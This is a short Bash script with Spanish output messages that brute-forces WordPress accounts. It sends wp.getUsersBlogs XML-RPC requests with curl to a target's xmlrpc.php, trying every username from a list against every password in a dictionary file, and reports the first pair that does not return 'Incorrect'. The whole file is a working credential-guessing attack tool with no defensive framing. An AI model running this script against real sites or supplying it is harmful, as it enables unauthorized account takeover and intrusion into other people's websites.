#!/bin/bash

if [[ -z $@ ]]; then
  echo "Modo de uso: $0 [HOST] [DICCIONARIO]"
fi

host="$1"
dict="$2"

for user in $(cat usuarios-wp.txt); do
	for psw in $(cat $dict); do 
		echo " 
		<methodCall>
			<methodName>wp.getUsersBlogs</methodName>
			<params>
				<param><value>$user</value></param>
				<param><value>$psw</value></param>
				</params>
		</methodCall>
		" > datos.xml
		echo "Probando $user:$psw"

		if [[ ! $(curl -s "$host/xmlrpc.php" -d @"datos.xml" | grep "Incorrect" &)  ]]; then
			echo "[+] $user:$psw"
			rm datos.xml
			exit 0
		fi; wait

		rm datos.xml

	done
done
